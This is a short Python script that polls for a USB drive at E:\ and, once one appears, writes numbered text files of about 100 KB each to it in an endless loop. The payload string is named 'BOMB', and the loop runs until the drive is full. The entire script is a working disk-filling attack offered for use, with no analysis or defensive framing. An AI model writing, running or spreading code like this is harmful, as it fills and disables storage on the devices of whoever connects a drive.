import os
import time

BOMB = '\n'.join([''.join(['1' for x in range(500)]) for y in range(200)])

print('Searching for USB...')
while not (os.path.exists('E:\\')):

    time.sleep(5)
    
print('USB Found!')
print('Dumping files...')

file = 0

while True:
    with open(os.path.join('E:\\',str(file)+'.txt'), 'w') as f:
        f.write(BOMB)
    file += 1

